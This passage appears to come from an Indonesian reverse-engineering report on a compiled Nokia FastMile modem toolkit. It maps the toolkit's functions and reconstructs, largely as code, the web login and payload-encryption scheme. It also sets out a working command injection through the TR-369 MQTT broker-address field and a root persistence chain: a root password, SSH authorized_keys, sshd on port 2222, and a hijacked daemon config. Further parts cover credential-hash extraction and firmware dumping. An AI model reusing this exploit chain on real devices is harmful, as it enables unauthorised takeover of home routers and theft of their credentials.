5. **`FastMileRCE` (baris 327, `mod_consts[1480..1495]`, 13 metode):** `__init__`, `_b64`, `_urlesc`, `_hp`, `_su`, `_open`, `login`, `_enc_post`, `_post_csrf`, `_set_params`, `execute_rce`, `deploy_detector`, `reboot_modem`. Atribut statis (`mod_consts[1495]`): `('host', 'user', 'pwd', 'base_url', 'cj', 'opener', 'session')`.
6. **`BusyBoxHandler` (baris 549, `mod_consts[1500..1505]`, subkelas `SimpleHTTPRequestHandler`, 2 metode):** `do_GET`, `log_message` (catatan: `log_message` berbagi implementasi fungsi kosong `0x18002bd00`).
7. **`BackgroundServers` (baris 570, `mod_consts[1507..1513]`, 5 metode):** `__init__`, `start_http`, `start_tcp_receiver`, `_tcp_loop`, `stop`. Atribut statis (`mod_consts[1513]`): `('config', 'httpd', 'http_thread', 'tcp_sock', 'tcp_thread', 'running', 'files_received', 'current_file', 'backup_done_event')`.
8. **`SSHSniper` (baris 682, `mod_consts[1514..1519]`, 3 metode):** `wait_for_shutdown`, `install_guardian`, `snipe`.
9. **`DumperEngine` (baris 892, `mod_consts[1520..1527]`, 7 metode):** `generate_dump_bash`, `generate_tarball_bash`, `execute_tarball_ssh`, `fetch_emmc_info`, `redump_single_partition`, `execute_dump_ssh`, `update_health_from_extcsd`.
10. **`MD5Validator` (baris 1418, `mod_consts[1528..1533]`, 3 metode):** `calculate_md5`, `verify`, `verify_with_auto_retry`. Daftar pengecualian RW (`mod_consts[1529]`): `['swr.img', 'userdata', 'swr', 'user_data.img', 'user_data', 'userdata.img']`.
11. **`FactoryMIMExtractor` (baris 1698, `mod_consts[1534..1553]`, 6 metode):** `parse_mim_block`, `scan_file_or_dump`, `extract_from_folder`, `normalize_path`, `lookup_potfile`, `format_credentials`.
12. **`DbaiNokiaApp` (baris 2022, `mod_consts[1554..1579]`, 22 metode):** `__init__`, `startup_wizard`, `is_ssh_connected`, `connect_ssh_helper`, `print_header`, `run_full_pipeline`, `menu_reboot`, `menu_sniper`, `open_interactive_shell`, `menu_root_exploit`, `menu_revoke_root`, `menu_servers`, `menu_dump_ssh`, `menu_tarball`, `menu_verify_md5`, `menu_change_superuser_pwd`, `extract_live_credentials`, `menu_extract_factory_mim`, `menu_openwrt_troll`, `menu_trigger_ota`, `menu_config`, `main_loop`. Atribut statis (`mod_consts[1579]`): `('config', 'servers', 'active_ssh')`.

### 3.3 Tabel Pemetaan Lengkap 75 Fungsi Native C di `_nuitka_temp.dll` (OBS, Tinggi)

Setiap fungsi dan metode Python di `dbai_nokia.py` dibangun oleh fungsi *factory* `MAKE_FUNCTION` (`VA 0x18000d120`–`0x18000f9b0`) yang memanggil `MAKE_CODE_OBJECT` (`0x180915fb0`) dan `Nuitka_Function_New` (`0x18090f850`):

| # | Nama Kualifikasi (`dbai_nokia.py`) | Baris | Slot `mod_consts` (`VA`) | VA `MAKE_FUNCTION` | VA Implementasi C (`impl`) | Argumen & Variabel Lokal (`co_varnames`) |
|---|---|---|---|---|---|---|
| 0 | `strip_ansi` | 79 | `0` (`0x18126e2d8`) | `0x18000d120` | `0x18000fb50` | `('s',)` |
| 1 | `pad_ansi` | 84 | `5` (`0x18126e300`) | `0x18000d1a0` | `0x180010070` | `('text', 'width', 'vis_len')` |
| 2 | `init_terminal` | 90 | `10` (`0x18126e328`) | `0x18000d220` | `0x180010850` | `()` |
| 3 | `clear_screen` | 100 | `17` (`0x18126e360`) | `0x18000d2a0` | `0x180010ec0` | `()` |
| 4 | `log_info` | 104 | `19` (`0x18126e370`) | `0x18000d310` | `0x180011270` | `('msg',)` |
| 5 | `log_success` | 108 | `24` (`0x18126e398`) | `0x18000d380` | `0x180011930` | `('msg',)` |
| 6 | `log_warn` | 112 | `28` (`0x18126e3b8`) | `0x18000d3f0` | `0x180011fb0` | `('msg',)` |
| 7 | `log_error` | 116 | `31` (`0x18126e3d0`) | `0x18000d460` | `0x180012560` | `('msg',)` |
| 8 | `Config.__init__` | 124 | `34` (`0x18126e3e8`) | `0x18000d4d0` | `0x180012be0` | `('self',)` |
| 9 | `Config.load_saved_config` | 141 | `62` (`0x18126e4c8`) | `0x18000d550` | `0x1800131c0` | `('self', 'base', 'cfg_file', 'f', 'data')` |
| 10 | `Config.save_config` | 157 | `73` (`0x18126e520`) | `0x18000d5e0` | `0x180014fb0` | `('self', 'target_dir', 'cfg_file', 'data', 'f')` |
| 11 | `Config._find_busybox` | 172 | `78` (`0x18126e548`) | `0x18000d670` | `0x180015ef0` | `('self', 'candidates', 'n_dir', 'p')` |
| 12 | `Config.detect_pc_ip` | 196 | `90` (`0x18126e5a8`) | `0x18000d700` | `0x180017310` | `('self', 'target_subnet', 'candidate_ips', 'out', 'line', 'parts', 'idx', 'ip', 'hostname', 'routed_ip', 's')` |
| 13 | `SSHKeyManager.fix_permissions` | 264 | `105` (`0x18126e620`) | `0x18000d790` | `0x180019280` | `('key_path', 'p', 'user', 'cmd')` |
| 14 | `SSHKeyManager.ensure_keys` | 284 | `115` (`0x18126e670`) | `0x18000d820` | `0x180019f10` | `('cls', 'key_name', 'priv_path', 'pub_path', 'key', 'pem_private', 'ssh_public', 'pub_str')` |
| 15 | `FastMileRCE.__init__` | 328 | `153` (`0x18126e7a0`) | `0x18000d8b0` | `0x18001c160` | `('self', 'host', 'user', 'pwd')` |
| 16 | `FastMileRCE._b64` | 338 | `169` (`0x18126e820`) | `0x18000d930` | `0x18001cd50` | `('b',)` |
| 17 | `FastMileRCE._urlesc` | 342 | `172` (`0x18126e838`) | `0x18000d9b0` | `0x18001d2f0` | `('s',)` |
| 18 | `FastMileRCE._hp` | 346 | `177` (`0x18126e860`) | `0x18000da30` | `0x18001d7e0` | `('cls', 'x', 'y')` |
| 19 | `FastMileRCE._su` | 350 | `184` (`0x18126e898`) | `0x18000dab0` | `0x18001e040` | `('cls', 'x', 'y')` |
| 20 | `FastMileRCE._open` | 353 | `187` (`0x18126e8b0`) | `0x18000db30` | `0x18001e550` | `('self', 'req', 'data', 'r', 'e')` |
| 21 | `FastMileRCE.login` | 363 | `198` (`0x18126e908`) | `0x18000dbb0` | `0x18001f160` | `('self', 'silent', '_', 'b', 'ni', 'e', 'n', 'rk', 'it', 'ie', 'salt_data', 'alati', 'K', 'ce', 'post_data', 'res', 'token')` |
| 22 | `FastMileRCE._enc_post` | 408 | `235` (`0x18126ea30`) | `0x18000dc40` | `0x180023190` | `('self', 'plain', 'key', 'iv', 'pt', 'pad_len', 'encryptor', 'ct', 'q', 'pub', 'ck')` |
| 23 | `FastMileRCE._post_csrf` | 427 | `253` (`0x18126eac0`) | `0x18000dcd0` | `0x180025030` | `('self', 'path', 'plain', 'body')` |
| 24 | `FastMileRCE._set_params` | 431 | `259` (`0x18126eaf0`) | `0x18000dd50` | `0x180025ae0` | `('self', 'kw', 'd', 'qs')` |
| 25 | `FastMileRCE.execute_rce` | 441 | `267` (`0x18126eb30`) | `0x18000ddd0` | `0x180026dc0` | `('self', 'cmd', 'wait', '_', 'b', 'out')` |
| 26 | `FastMileRCE.deploy_detector` | 453 | `284` (`0x18126ebb8`) | `0x18000de60` | `0x180027eb0` | `('self', 'pubkey_content', 'D', 'pub_safe', 'keeper', 'i', 'l', 'op', 'det')` |
| 27 | `FastMileRCE.reboot_modem` | 521 | `307` (`0x18126ec70`) | `0x18000def0` | `0x180029900` | `('self', 'silent', 'code', 'body', 'e')` |
| 28 | `BusyBoxHandler.do_GET` | 553 | `320` (`0x18126ecd8`) | `0x18000e010` | `0x18002aad0` | `('self', 'f', 'chunk', '__class__')` |
| 29 | `BackgroundServers.__init__` | 571 | `334` (`0x18126ed48`) | `0x18000e190` | `0x18002bd00` | `('self', 'config')` |
| 30 | `BackgroundServers.start_http` | 582 | `346` (`0x18126eda8`) | `0x18000e210` | `0x18002c420` | `('self', 'e')` |
| 31 | `BackgroundServers.start_tcp_receiver` | 594 | `357` (`0x18126ee00`) | `0x18000e290` | `0x18002d5e0` | `('self', 'backup_dir', 'e')` |
| 32 | `BackgroundServers._tcp_loop` | 613 | `373` (`0x18126ee80`) | `0x18000e310` | `0x18002edd0` | `('self', 'conn', 'addr', 'header_data', 'chunk', 'filename_bytes', 'rest', 'filename', 'filepath', 'f', 'data', 'e')` |
| 33 | `BackgroundServers.stop` | 664 | `414` (`0x18126efc8`) | `0x18000e390` | `0x180033100` | `('self',)` |
| 34 | `SSHSniper.wait_for_shutdown` | 684 | `417` (`0x18126efe0`) | `0x18000e410` | `0x180033a60` | `('cls', 'ip', 'check_ports', 'timeout', 'start', 'consecutive_offline', 'saw_online', 'alive', 'p', 'elapsed')` |
| 35 | `SSHSniper.install_guardian` | 730 | `434` (`0x18126f068`) | `0x18000e4a0` | `0x180035880` | `('cls', 'client', 'port', 'guardian_script')` |
| 36 | `SSHSniper.snipe` | 758 | `443` (`0x18126f0b0`) | `0x18000e530` | `0x180036130` | `('cls', 'config', 'timeout_total', 'retry_delay', 'wait_shutdown', 'start_time', 'attempt', 'priv_key_path', 'port', 'sock_open', 'client', 'connected', 'uptime_info', '_', 'stdout', 'up_raw', 'up_sec', 'sniper_init')` |
| 37 | `DumperEngine.generate_dump_bash` | 894 | `479` (`0x18126f1d0`) | `0x18000e5c0` | `0x18003aec0` | `('config',)` |
| 38 | `DumperEngine.generate_tarball_bash` | 964 | `489` (`0x18126f220`) | `0x18000e650` | `0x18003b9b0` | `('config',)` |
| 39 | `DumperEngine.execute_tarball_ssh` | 990 | `495` (`0x18126f250`) | `0x18000e6e0` | `0x18003c0b0` | `('cls', 'ssh_client', 'config', 'bash', 'stdin', 'stdout', 'stderr', 'line', 'line_str', 'p1', 'p2', 'data_ok', 'rom_ok', 'err')` |
| 40 | `DumperEngine.fetch_emmc_info` | 1028 | `517` (`0x18126f300`) | `0x18000e770` | `0x18003e8a0` | `('cls', 'ssh_client', 'config', 'non_user_dir', 'query_cmd', 'batch_cmd', 'props', 'attempt', ...)` |
| 41 | `DumperEngine.redump_single_partition` | 1224 | `615` (`0x18126f610`) | `0x18000e800` | `0x1800487f0` | `('cls', 'ssh_client', 'config', 'label', 'part_name', 'cmd', 'base_l', 'stdin', 'stdout', 'stderr', 'line', 'e')` |
| 42 | `DumperEngine.execute_dump_ssh` | 1274 | `644` (`0x18126f6f8`) | `0x18000e890` | `0x18004a850` | `('cls', 'ssh_client', 'config', 'target_abs', 'total_b', 'used_b', 'free_b', 'free_gb', 'c', 'e', 'bash_script', ...)` |
| 43 | `DumperEngine.update_health_from_extcsd` | 1335 | `673` (`0x18126f7e0`) | `0x18000e920` | `0x18004eda0` | `('cls', 'config', 'non_user_dir', 'bin_path', 'txt_path', 'info_path', 'f', 'content', 'life_a', 'life_b', 'pre_eol', ...)` |
| 44 | `MD5Validator.calculate_md5` | 1426 | `690` (`0x18126f868`) | `0x18000e9b0` | `0x180053670` | `('filepath', 'hash_md5', 'file_size', 'processed', 'f', 'chunk', 'pct')` |
| 45 | `MD5Validator.verify` | 1447 | `702` (`0x18126f8c8`) | `0x18000ea30` | `0x1800553a0` | `('cls', 'target_dir', 'target_files', 'previous_results', 'md5_path', 'root', '_', 'files', ...)` |
| 46 | `MD5Validator.verify_with_auto_retry` | 1608 | `776` (`0x18126fb18`) | `0x18000eab0` | `0x18005ef50` | `('cls', 'ssh_client', 'config', 'max_retries', 'current_results', 'total_checked', 'failed', 'attempt', ...)` |
| 47 | `FactoryMIMExtractor.parse_mim_block` | 1712 | `818` (`0x18126fc68`) | `0x18000eb40` | `0x1800630b0` | `('cls', 'raw_bytes', 'entries', 'needle', 'idx', 'start_pos', 'prod_key_pos', 'prev_k', 'end_limit', 'p', 'k_raw', 'v_raw', 'k_canon')` |
| 48 | `FactoryMIMExtractor.scan_file_or_dump` | 1748 | `829` (`0x18126fcc0`) | `0x18000ebd0` | `0x180064f50` | `('cls', 'file_path', 'file_size', 'f', 'data', 'entries', 'needle', 'chunk_size', 'overlap', 'pos', 'chunk', 'idx', 'cand_start', 'block', 'abs_offset')` |
| 49 | `FactoryMIMExtractor.extract_from_folder` | 1788 | `850` (`0x18126fd68`) | `0x18000ec60` | `0x180067780` | `('cls', 'folder_path', 'items', 'e', 'files', 'file', 'full_p', 'fl', 'entries', 'desc')` |
| 50 | `FactoryMIMExtractor.normalize_path` | 1824 | `862` (`0x18126fdc8`) | `0x18000ecf0` | `0x1800697a0` | `('cls', 'raw_path', 'p', 'drive', 'wsl_cand')` |
| 51 | `FactoryMIMExtractor.lookup_potfile` | 1848 | `868` (`0x18126fdf8`) | `0x18000ed80` | `0x180069f20` | `('cls', 'hex_hash', 'target_hash', 'potfile_paths', 'pot_path', 'f', 'line')` |
| 52 | `FactoryMIMExtractor.format_credentials` | 1874 | `880` (`0x18126fe58`) | `0x18000ee10` | `0x18006bb60` | `('cls', 'entries', 'shadow_hash', 'source_label', 'superadmin_hex', 'input_web_pwd', 'product', 'hwversion', 'sn', 'mac', 'imei', ...)` |
| 53 | `DbaiNokiaApp.__init__` | 2023 | `966` (`0x181270108`) | `0x18000eeb0` | `0x18006f220` | `('self',)` |
| 54 | `DbaiNokiaApp.startup_wizard` | 2029 | `972` (`0x181270138`) | `0x18000ef30` | `0x18006fb50` | `('self', 'box_w', 'b_col', 'div', 'title_txt', 'title_bar', 'lines', 'line', 'modem_default', 'modem_in', 'pwd_prompt', 'pwd_in', 'rce', 'e', 'retry', 'pc_ip', 'is_matched', 'sub', 'manual_ip')` |
| 55 | `DbaiNokiaApp.is_ssh_connected` | 2148 | `1059` (`0x1812703f0`) | `0x18000efc0` | `0x180076850` | `('self', 'transport')` |
| 56 | `DbaiNokiaApp.connect_ssh_helper` | 2157 | `1061` (`0x181270400`) | `0x18000f050` | `0x180076f90` | `('self', 'timeout_sniper', 'p', 's', 'res', 'c', 'priv_key_path', 'web_alive', 'sub', 'rce', 'pubkey', 'client', 'port', 'e')` |
| 57 | `DbaiNokiaApp.print_header` | 2235 | `1087` (`0x1812704d0`) | `0x18000f0e0` | `0x18007b330` | `('self', 'os_name', 'f', 'content', 'ssh_is_alive', 'ssh_status', 'ip_display', 'col_l', 'col_r', 'b_col', 'div', 'l1', 'r1', 'l2', 'r2')` |
| 58 | `DbaiNokiaApp.run_full_pipeline` | 2285 | `1103` (`0x181270550`) | `0x18000f160` | `0x18007df60` | `('self', 'c', 'pubkey', 'rce', 'e', 'ans', 'success', 'client', 'port', 'pipeline_ok')` |
| 59 | `DbaiNokiaApp.menu_reboot` | 2368 | `1141` (`0x181270680`) | `0x18000f1f0` | `0x1800812a0` | `('self', 'reboot_triggered', 'e', 'rce', 'success', 'ans')` |
| 60 | `DbaiNokiaApp.menu_sniper` | 2417 | `1153` (`0x1812706e0`) | `0x18000f270` | `0x180083fe0` | `('self', 'wait_shutdown', 'ask', 'client', 'port', 'connected', 'peer')` |
| 61 | `DbaiNokiaApp.open_interactive_shell` | 2457 | `1165` (`0x181270740`) | `0x18000f2f0` | `0x180085c70` | `('self', 'port', 'refresh_cmd', 'null_file', 'key_arg', 'cmd', 'e')` |
| 62 | `DbaiNokiaApp.menu_root_exploit` | 2503 | `1178` (`0x1812707a8`) | `0x18000f380` | `0x180088540` | `('self', 'pubkey', 'rce', 'e')` |
| 63 | `DbaiNokiaApp.menu_revoke_root` | 2516 | `1182` (`0x1812707c8`) | `0x18000f400` | `0x180089440` | `('self', 'confirm', 'cleanup_cmd', 'success', 'stdin', 'stdout', 'stderr', 'e', 'rce', 'rb', 'rebooted')` |
| 64 | `DbaiNokiaApp.menu_servers` | 2593 | `1204` (`0x181270878`) | `0x18000f480` | `0x18008c160` | `('self',)` |
| 65 | `DbaiNokiaApp.menu_dump_ssh` | 2601 | `1207` (`0x181270890`) | `0x18000f500` | `0x18008c8e0` | `('self',)` |
| 66 | `DbaiNokiaApp.menu_tarball` | 2621 | `1213` (`0x1812708c0`) | `0x18000f580` | `0x18008d640` | `('self',)` |
| 67 | `DbaiNokiaApp.menu_verify_md5` | 2640 | `1217` (`0x1812708e0`) | `0x18000f600` | `0x18008e280` | `('self', 'ans', 'connected')` |
| 68 | `DbaiNokiaApp.menu_change_superuser_pwd` | 2675 | `1230` (`0x181270948`) | `0x18000f680` | `0x18008fcc0` | `('self', 'raw_pwd', 'new_pwd', 'pwd_sha256', 'connected', 'cmd', 'stdin', 'stdout', 'stderr', 'exit_status', 'out', 'err', 'e')` |
| 69 | `DbaiNokiaApp.extract_live_credentials` | 2737 | `1260` (`0x181270a38`) | `0x18000f700` | `0x1800930f0` | `('self', 'interactive', 'connected', 'superadmin_hex', 'entries', 'shadow_hash', 'source_label', 'cmd', ..., 'local_candidates', 'local_bin', 'sftp', ...)` |
| 70 | `DbaiNokiaApp.menu_extract_factory_mim` | 2833 | `1293` (`0x181270b40`) | `0x18000f790` | `0x1800994a0` | `('self', 'sub', 'raw_path', 'target_path', 'entries', 'source_label', 'e', 'superadmin_hex', 'formatted_txt', 'sn', 'target_dir', 'target_filepath', 'f')` |
| 71 | `DbaiNokiaApp.menu_openwrt_troll` | 2910 | `1313` (`0x181270be0`) | `0x18000f810` | `0x18009d340` | `('self',)` |
| 72 | `DbaiNokiaApp.menu_trigger_ota` | 2935 | `1325` (`0x181270c40`) | `0x18000f8a0` | `0x18009ee70` | `('self', 'connected', 'stdin', 'stdout', 'stderr', 'ver_raw', 'c', 'cmd_enable', 'cmd_trigger', 'cmd_log', 'ota_log')` |
| 73 | `DbaiNokiaApp.menu_config` | 3009 | `1352` (`0x181270d18`) | `0x18000f930` | `0x1800a1a60` | `('self', 'sub', 'v', 'ip', 'is_matched')` |
| 74 | `DbaiNokiaApp.main_loop` | 3058 | `1376` (`0x181270dd8`) | `0x18000f9b0` | `0x1800a3e20` | `('self', 'choice')` |

*(Catatan: Selain 75 fungsi utama di atas, terdapat fungsi bersarang/generator lokal seperti `FastMileRCE._set_params.<locals>.<genexpr>` pada slot `262` `0x1800263b0`, `DumperEngine.fetch_emmc_info.<locals>.query_cmd` pada slot `522` `0x180045eb0`, `MD5Validator.calculate_md5.<locals>.<lambda>` pada slot `694`, dan `MD5Validator.verify.<locals>.<genexpr>` pada slot `773`.)*

---

## 4. Spesifikasi Protokol & Kriptografi `FastMileRCE` (Telah Dikoreksi)

Seluruh bagian §4 ini direkonstruksi langsung dari *disassembly* fungsi C terkompilasi (`VA 0x18001c160`–`0x180029900`) dan `mod_consts[153..318]`.

### 4.1 Transportasi HTTP & State Sesi (`FastMileRCE.__init__` `0x18001c160` & `_open` `0x18001e550`) (OBS, Tinggi)

- **Inisialisasi (`__init__`, baris 328):**
  - `self.host = host` (default `'192.168.1.1'`), `self.user = user` (default `'admin'`), `self.pwd = pwd`.
  - `self.base_url = f"http://{host}"` (jika `host` belum diawali `'http'`).
  - `self.cj = http.cookiejar.CookieJar()`
  - `self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))`
  - `self.session = {}`
- **Fungsi Pembuka HTTP (`_open(self, req, data=None)`, baris 353, `mod_consts[187..197]`):**
  - Jika `data` diberikan, menambahkan header `Content-Type: application/x-www-form-urlencoded` (`mod_consts[189]`).
  - Selalu menambahkan header `User-Agent: Mozilla/5.0 (DBAI-Nokia-Toolkit)` (`mod_consts[190]`).
  - Memanggil `self.opener.open(req, data=data, timeout=20)` (`mod_consts[191] = (20,)`).
  - Mengembalikan tuple `(r.status, r.read().decode('utf-8', 'replace'))`; jika terjadi `urllib.error.HTTPError`, menangkap `e` dan mengembalikan `(e.code, e.read().decode('utf-8', 'replace'))`.

### 4.2 Empat Fungsi Bantu Encoding & Hashing (`_b64`, `_urlesc`, `_hp`, `_su`) (OBS, Tinggi)

Keempat metode statis/kelas ini menjadi fondasi seluruh pertukaran autentikasi dan enkripsi Web CGI Nokia (`VA 0x18001cd50`–`0x18001e040`, `mod_consts[169..186]`):

```python
@staticmethod
def _b64(b: bytes) -> str:
    # VA 0x18001cd50 (baris 338, mod_consts[169..171])
    return base64.b64encode(b).decode()

@staticmethod
def _urlesc(s: str) -> str:
    # VA 0x18001d2f0 (baris 342, mod_consts[172..176])
    # KOREKSI AUDIT: Bukan urllib.parse.quote, melainkan substitusi karakter Base64 khusus Nokia Web CGI
    return s.replace('+', '-').replace('/', '_').replace('=', '.')

@classmethod
def _hp(cls, x: str, y: str) -> str:
    # VA 0x18001d7e0 (baris 346, mod_consts[177..183])
    # KOREKSI AUDIT (sebelumnya UNK): Base64 dari digest SHA-256 biner atas "x:y"
    return cls._b64(hashlib.sha256(f"{x}:{y}".encode()).digest())

@classmethod
def _su(cls, x: str, y: str) -> str:
    # VA 0x18001e040 (baris 350, mod_consts[184..186])
    # KOREKSI AUDIT (sebelumnya salah ditebak sebagai superuser/RCE helper): _urlesc(_hp(x, y))
    return cls._urlesc(cls._hp(x, y))
```

### 4.3 Alur Autentikasi Web CGI (`FastMileRCE.login`, `VA 0x18001f160`, Baris 363) (OBS, Tinggi)

Meskipun *docstring* penulis (`mod_consts[234]`) menyebut *"using PBKDF2/SHA256"*, *disassembly* pada `0x18001f160`–`0x180023190` membuktikan algoritma sebenarnya adalah **iterated SHA-256** dengan 4 langkah berurutan berikut:

1. **Pengambilan Nonce (`0x18001f49e`–`0x18001f99e`):**
   - Mengirim `GET {self.base_url}/login_web_app.cgi?nonce` (`mod_consts[202]`).
   - Mem-parsing respons JSON `ni = json.loads(b)`:
     - `n = ni['nonce']`
     - `rk = ni['randomKey']`
     - `it = int(ni.get('iterations', 0))`
     - `ie = (it >= 2)` (`mod_consts[96] = 2`)
   - Menyimpan ke `self.session.update({'nonce': n, 'randomKey': rk, 'iterations': it, 'pubkey': ni.get('pubkey', '')})`.
2. **Pertukaran Salt (`0x18001fa11`–`0x18001ff92` — hanya dieksekusi bila `ie` bernilai `True`):**
   - Membentuk `salt_data = f"userhash={self._su(self.user, n)}&nonce={self._urlesc(n)}".encode()`.
   - Mengirim `POST {self.base_url}/login_web_app.cgi?salt` dengan body `salt_data`.
   - Membaca string salt `alati = json.loads(b).get('alati', '')` (`mod_consts[219]`).
3. **Derivasi Kunci Iterated SHA-256 (`0x1800200ab`–`0x180021794`):**
   - Jika `ie` (`it >= 2`):
     ```python
     # Baris 386 (0x1800200bd..0x18002023d): putaran pertama atas (alati + self.pwd)
     K = hashlib.sha256((alati + self.pwd).encode()).hexdigest()
     # Baris 387-388 (0x180020248..0x1800215e1): (it - 1) putaran berikutnya atas bytes.fromhex(K)
     for _ in range(1, it):
         K = hashlib.sha256(bytes.fromhex(K)).hexdigest()
     # Baris 390 (0x18002167c..0x180021794):
     ce = self._hp(self.user, K.lower())
     ```
   - Jika `not ie` (`it < 2`):
     ```python
     ce = self._hp(self.user, self.pwd)
     ```
4. **Pertukaran Token Sesi (`0x18002179f`–`0x180022a18`):**
   - Membentuk body `post_data` (`mod_consts[215, 222, 223, 216, 224, 227]`):
     ```python
     post_data = (
         f"userhash={self._su(self.user, n)}"
         f"&RandomKeyhash={self._su(self.user, rk)}"
         f"&response={self._su(ce, n)}"
         f"&nonce={self._urlesc(n)}"
         f"&enckey={self._urlesc(self._b64(os.urandom(16)))}"
         f"&enciv={self._urlesc(self._b64(os.urandom(16)))}"
     ).encode()
     ```
   - Mengirim `POST {self.base_url}/login_web_app.cgi` (`mod_consts[228]`) dengan `data=post_data`.
   - Mem-parsing JSON `res = json.loads(b)`, memperbarui `self.session.update(res)`, dan memeriksa `token = self.session.get('token')`. Jika tidak ada, melempar eksepsi `'Login gagal: Token sesi tidak ditemukan. Periksa password admin!'`.

### 4.4 Enkripsi Payload `_enc_post` & Proteksi CSRF `_post_csrf` (OBS, Tinggi)

1. **`FastMileRCE._enc_post(self, plain: str) -> str` (`VA 0x180023190`, baris 408, `mod_consts[235..252]`):**
   - Membangkitkan kunci AES-128 dan IV acak per panggilan: `key = os.urandom(16)` dan `iv = os.urandom(16)`.
   - Melakukan *padding* PKCS#7 manual pada `pt = plain.encode()`:
     `pad_len = 16 - (len(pt) % 16); pt = pt + (bytes([pad_len]) * pad_len)`.
   - Mengenkripsi `pt` dengan `Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()`:
     `ct = encryptor.update(pt) + encryptor.finalize()`.
   - Membentuk string gabungan Base64 kunci dan IV yang dipisahkan satu spasi (`mod_consts[7] = ' '` pada `0x180023868`):
     `q = f"{base64.b64encode(key).decode()} {base64.b64encode(iv).decode()}"`.
   - Memuat kunci publik RSA modem (`pub = serialization.load_pem_public_key(self.session['pubkey'].encode())`) dan mengenkripsi `q.encode()` dengan `padding.PKCS1v15()`:
     `ck = pub.encrypt(q.encode(), padding.PKCS1v15())`.
   - Mengembalikan format string (`mod_consts[248]`):
     ```python
     return "encrypted=1&ct=%s&ck=%s" % (
         base64.urlsafe_b64encode(ct).decode().rstrip('='),
         base64.b64encode(ck).decode().replace('+', '-').replace('/', '_').replace('=', '.')
     )
     ```
2. **`FastMileRCE._post_csrf(self, path: str, plain: str = "")` (`VA 0x180025030`, baris 427, `mod_consts[253..257]`):**
   - Menggabungkan parameter **`csrf_token=`** (bukan `ucsrf_token=`):
     `body = (f"{plain}&" if plain else "") + f"csrf_token={self.session.get('token', '')}"`.
   - Mengirim `POST {self.base_url}/{path}` dengan `data=self._enc_post(body).encode()`.

### 4.5 Vektor Injeksi Perintah TR-369 (`_set_params`, `execute_rce`, `deploy_detector`, `reboot_modem`) (OBS, Tinggi)

1. **`_set_params(self, **kw)` (`VA 0x180025ae0`, baris 431, `mod_consts[258..266]`):**
   - Kamus parameter default (`mod_consts[258]`):
     `d = {'enableusp': '1', 'controllerEndpoint': '', 'mtp_protocol': 'MQTT', 'mqtt_transportprotocol': 'TCP/IP', 'mqtt_brokeraddress': '', 'mqtt_brokerport': '1883', 'mqtt_username': '', 'mqtt_password': ''}`.
   - Memperbarui `d.update(kw)`, menyusun query string `qs = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in d.items())`, lalu memanggil `self._post_csrf('tr369_web_app.cgi?set_params', qs)`.
2. **`execute_rce(self, cmd: str, wait: float = 0.5)` (`VA 0x180026dc0`, baris 441, `mod_consts[267..283]`):**
   - Memanggil `self._set_params(mqtt_brokeraddress=f"127.0.0.1\`{cmd}\`")` (`mod_consts[269..271]`), lalu `time.sleep(wait)`.
   - Mengambil status dari `GET {self.base_url}/tr369_status_web_app.cgi` (`mod_consts[274]`), mem-parsing JSON `tr369_config['MQTT']['BrokerAddress']`, dan jika nilainya diawali `'127.0.0.1'`, memotong 9 karakter pertama (`out = val[9:]`, `mod_consts[279] = slice(9, None, None)`) untuk memperoleh stdout hasil eksekusi perintah.
3. **`deploy_detector(self, pubkey_content: str)` (`VA 0x180027eb0`, baris 453, `mod_consts[284..306]`):**
   - Membuat direktori `/configs/nonpersistant` dan menulis kunci publik SSH ke `/configs/nonpersistant/fastmile_key`.
   - Menulis skrip penjaga `/configs/nonpersistant/fastmile_keeper.sh` (`mod_consts[291]`, memeriksa PID `/tmp/fastmile_keeper.pid`, memastikan aturan `iptables` port `2222`, dan menyalakan `/usr/sbin/sshd -p 2222`).
   - Menulis skrip `/configs/nonpersistant/fastmile_detector` (`mod_consts[299]`, me-*remount* `/` sebagai `rw`, mengatur password `root`, menyalin kunci ke `/root/.ssh/authorized_keys`, menyalin `/bin/init_action.sh` ke `/configs/init_action.sh` sambil mengomentari baris `killall -9 sshd`, mengizinkan `PermitRootLogin yes` di `/etc/ssh/sshd_config*`, menyalakan `sshd` di port `2222`, menjalankan `fastmile_keeper.sh` via `nohup`, dan mencatat `id` ke `/configs/nonpersistant/rootdone`).
   - Membajak konfigurasi daemon hardware AIC dengan menyunting `/etc/hb/aic_conf.json` via `sed` agar *path* `*_detector` diarahkan ke `/bin/sh /configs/nonpersistant/fastmile_detector`, lalu menyimpannya ke `/configs/aic_conf.json` (`mod_consts[304]`).
4. **`reboot_modem(self, silent: bool = False)` (`VA 0x180029900`, baris 521, `mod_consts[307..318]`):**
   - Memanggil `self._post_csrf('reboot_web_app.cgi', '')` dan memeriksa kode HTTP `200`.

---

## 5. Spesifikasi `BusyBoxHandler`, `BackgroundServers`, `SSHSniper`, `DumperEngine`, dan `MD5Validator`

### 5.1 Server Latar Belakang PC (`BusyBoxHandler` & `BackgroundServers`, Baris 549–664) (OBS, Tinggi)

1. **`BusyBoxHandler` (`VA 0x18002aad0`, `mod_consts[320..333, 1500..1505]`):**
   - Subkelas `http.server.SimpleHTTPRequestHandler`.
   - Metode `do_GET` melayani permintaan `/busybox` dengan membuka berkas `config.busybox_path` (yang ditemukan oleh `Config._find_busybox` di `NUITKA_ONEFILE_DIRECTORY/bin/busybox` — yaitu entri KAX #25 berukuran `1.148.524` byte) dan mengalirkannya dalam blok 64 KiB dengan `Content-Type: application/octet-stream`.
   - Metode `log_message` dibungkam (`pass`, `VA 0x18002bd00`).
2. **`BackgroundServers` (`VA 0x18002bd00`–`0x180033100`, `mod_consts[334..416]`):**
   - **HTTP Server (`start_http`, `0x18002c420`):** Berjalan di *daemon thread* pada `0.0.0.0:8081` (`config.http_port`).
   - **TCP Receiver (`start_tcp_receiver` `0x18002d5e0` & `_tcp_loop` `0x18002edd0`):**
     - Mendengarkan koneksi masuk pada `0.0.0.0:8888` (`config.tcp_port`) dengan *socket timeout* `60` detik (`mod_consts[376]`).
     - **Framing Protokol Streaming (`b'::::'`):** Setiap koneksi TCP mengirimkan *header* nama berkas relatif diikuti pembatas **4 titik dua (`b'::::'`, `mod_consts[377]`)**, lalu langsung diikuti aliran byte mentah partisi/berkas hingga EOF soket (`chunk = conn.recv(1048576)`, blok 1 MiB, `mod_consts[389]`).
